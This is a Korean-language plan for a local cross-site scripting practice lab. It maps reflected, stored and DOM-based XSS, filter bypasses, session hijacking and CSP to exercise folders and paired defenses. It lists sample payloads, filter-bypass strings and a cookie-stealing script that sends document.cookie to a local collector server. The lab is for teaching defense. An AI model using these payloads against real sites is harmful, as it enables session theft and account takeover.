# XSS 실습 환경 구축 계획

> **목적**: xss.md 이론을 직접 손으로 공격해보며 체화하는 로컬 학습 환경
> **원칙**: 본인 소유 로컬 머신에서만 동작하는 격리된 환경. 실제 서비스 대상 공격 금지.

---

## 0. 이론 → 실습 연결 맵

| xss.md 항목 | 실습 디렉토리 |
|---|---|
| Reflected XSS | `01-reflected/` |
| Stored XSS | `02-stored/` |
| DOM-based XSS | `03-dom-based/` |
| 필터 우회 / 인코딩 | `04-filter-bypass/` |
| 세션 하이재킹 | `05-session-hijack/` |
| CSP / HttpOnly | `06-csp-lab/` |

---

## 1. 학습 순서 로드맵

```
[1단계] 03-dom-based       → 서버 불필요, 브라우저만으로 즉시 실습
[2단계] 01-reflected/js    → location.search/hash 기반 반사형 원리
[3단계] 01-reflected/php   → 서버사이드 echo 취약점
[4단계] 02-stored          → DB 저장/조회 영속성 개념
[5단계] 04-filter-bypass   → 방어 코드 적용 후 우회 기법 학습
[6단계] 05-session-hijack  → XSS의 실제 파급력 체감
[7단계] 06-csp-lab         → 방어 기술의 효과와 한계 확인
```

---

## 2. 디렉토리 구조

```
xss/
├── xss.md                          # 이론 노트
├── xss-plan.md                     # 이 파일
│
├── 01-reflected/
│   ├── vulnerable/
│   │   ├── php/search.php          # GET 파라미터 미필터 출력
│   │   ├── php/error.php           # 에러 메시지 반사
│   │   └── js/index.html           # location.search 직접 DOM 삽입
│   ├── secure/
│   │   ├── php/search_safe.php
│   │   └── js/index_safe.html
│   └── README.md
│
├── 02-stored/
│   ├── vulnerable/
│   │   ├── php/board.php           # 게시판 (SQLite)
│   │   └── js/guestbook.html       # localStorage 기반 방명록
│   ├── secure/
│   │   ├── php/board_safe.php
│   │   └── js/guestbook_safe.html
│   └── README.md
│
├── 03-dom-based/
│   ├── vulnerable/
│   │   ├── innerHTML.html
│   │   ├── eval.html
│   │   └── document_write.html
│   ├── secure/
│   │   └── safe_dom.html
│   └── README.md
│
├── 04-filter-bypass/
│   ├── bypass_demo.html
│   └── README.md
│
├── 05-session-hijack/
│   ├── victim/
│   │   ├── login.php
│   │   └── mypage.php
│   ├── attacker/
│   │   ├── collector.php
│   │   └── log.txt
│   └── README.md
│
└── 06-csp-lab/
    ├── no-csp.html
    ├── csp-strict.html
    └── README.md
```

---

## 3. 공격 시나리오 목록

### 3-1. Reflected XSS

| ID | 시나리오 | 스택 | 공격 벡터 |
|---|---|---|---|
| R-01 | GET 파라미터 즉시 출력 | PHP | `?q=<script>alert(1)</script>` |
| R-02 | 에러 메시지 내 입력값 반사 | PHP | `?id=<img src=x onerror=alert(1)>` |
| R-03 | location.search DOM 삽입 | Vanilla JS | `?name=<svg onload=alert(1)>` |

**핵심**: 서버가 입력값을 HTML에 직접 echo할 때 발생. 해시(#) 이후 값은 서버 로그에 안 남음.

### 3-2. Stored XSS

| ID | 시나리오 | 스택 | 공격 벡터 |
|---|---|---|---|
| S-01 | 게시판 글 제목에 스크립트 저장 | PHP + SQLite | 글 등록 폼에 `<script>` 입력 |
| S-02 | localStorage 기반 방명록 | Vanilla JS | 새 탭 열 때마다 저장된 스크립트 실행 |

**핵심**: 한 번 저장된 페이로드가 모든 방문자에게 실행. localStorage로 서버 없이 Stored XSS 시뮬레이션 가능.

### 3-3. DOM-based XSS

| ID | 취약 API | 공격 벡터 |
|---|---|---|
| D-01 | `innerHTML` | URL 파라미터 → innerHTML 직접 삽입 |
| D-02 | `eval()` | URL 파라미터 → eval() 실행 |
| D-03 | `document.write()` | location 값 → document.write 출력 |

**핵심**: 서버 응답이 정상이어도 클라이언트 JS가 취약하면 공격 성립. Burp Suite에 안 잡히는 경우 있음.

### 3-4. 필터 우회

| ID | 우회 기법 | 페이로드 예시 | 뚫는 필터 가정 |
|---|---|---|---|
| B-01 | 대소문자 혼합 | `<ScRiPt>alert(1)</sCrIpT>` | 소문자 `<script>` 블랙리스트 |
| B-02 | 이벤트 핸들러 | `<img src=x onerror=alert(1)>` | script 태그만 필터 |
| B-03 | javascript: 프로토콜 | `<a href="javascript:alert(1)">` | href 필터 없음 |
| B-04 | HTML 엔티티 인코딩 | `<img src=x onerror=&#97;lert(1)>` | 단순 문자열 매칭 |
| B-05 | SVG 벡터 | `<svg><script>alert(1)</script></svg>` | HTML 파서 vs SVG 파서 차이 |
| B-06 | 속성 내 공백 제거 | `<img/src=x/onerror=alert(1)>` | 공백 기준 파싱 |

### 3-5. 세션 하이재킹 전체 흐름

```
1. 피해자 → victim/login.php 로그인 → 세션 쿠키 발급
2. 공격자 → Stored XSS 게시글에 페이로드 삽입:
   <script>new Image().src="http://localhost:9000/collector.php?c="+document.cookie</script>
3. 피해자 → 게시글 열람 → 쿠키가 collector.php로 전송 → log.txt에 기록
4. 공격자 → log.txt에서 세션 ID 확인 → 브라우저 쿠키 직접 세팅 → 피해자 계정 접근
```

서버 2개 동시 실행:
```bash
php -S localhost:8080 -t xss/05-session-hijack/victim/   # 피해자 앱
php -S localhost:9000 -t xss/05-session-hijack/attacker/ # 공격자 수집 서버
```

---

## 4. 앱 구축 계획

### 4-1. PHP 앱 원칙
- DB: SQLite (PDO_SQLITE, 설치 불필요)
- 각 파일에 DB 초기화 코드 포함 (독립 실행 가능)
- `php -S localhost:PORT` 명령 하나로 실행
- 안전 버전: `_safe.php` 접미사

### 4-2. Vanilla JS 앱 원칙
- 서버 없이 브라우저로 직접 열거나 `npx http-server`로 실행
- localStorage로 Stored XSS 영속성 시뮬레이션
- Cookie/session 관련 실습은 http-server 필요 (file:// 프로토콜 제한)

### 4-3. PHP / JS 번갈아 구성 이유
- **PHP**: 서버사이드 렌더링에서 발생하는 XSS 구조 이해
- **JS**: 클라이언트사이드에서만 발생하는 DOM-based XSS 특성 이해
- 같은 공격 유형을 두 스택으로 구현 → 취약점이 언어/스택에 종속되지 않음을 체감

---

## 5. 각 앱 README 템플릿

```markdown
## [앱 이름]

### 실행 방법
### 취약점 설명 (어느 코드가 왜 취약한지)
### 공격 재현 절차 (단계별)
### 페이로드 모음
### 방어 버전 비교
### xss.md 연결 항목
```

---

## 6. 방어 기법 적용 계획

### PHP 방어
| 기법 | 코드 |
|---|---|
| Output Encoding | `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')` |
| Content-Type 명시 | `header('Content-Type: text/html; charset=UTF-8')` |
| HttpOnly Cookie | `session_set_cookie_params(['httponly' => true])` |
| CSP 헤더 | `header("Content-Security-Policy: default-src 'self'")` |

### Vanilla JS 방어
| 기법 | 코드 |
|---|---|
| textContent 사용 | `element.textContent = userInput` |
| createElement 사용 | `document.createElement('p')` |
| eval 제거 | `JSON.parse()` 사용 |
| DOMPurify | `DOMPurify.sanitize(input)` |

---

## 7. 실행 환경 확인

```bash
php --version           # PHP 7.4+ 필요
php -m | grep sqlite    # PDO_SQLite 확인
npx http-server --version
```

---

## 8. 진행 상황 체크리스트

- [ ] 01-reflected: PHP 취약 버전
- [ ] 01-reflected: PHP 안전 버전
- [ ] 01-reflected: JS 취약 버전
- [ ] 01-reflected: JS 안전 버전
- [ ] 02-stored: PHP 취약 버전 (SQLite)
- [ ] 02-stored: PHP 안전 버전
- [ ] 02-stored: JS 취약 버전 (localStorage)
- [ ] 02-stored: JS 안전 버전
- [ ] 03-dom-based: innerHTML.html
- [ ] 03-dom-based: eval.html
- [ ] 03-dom-based: document_write.html
- [ ] 03-dom-based: safe_dom.html
- [ ] 04-filter-bypass: bypass_demo.html
- [ ] 05-session-hijack: victim 앱 (PHP)
- [ ] 05-session-hijack: attacker 수집 서버 (PHP)
- [ ] 06-csp-lab: no-csp.html
- [ ] 06-csp-lab: csp-strict.html
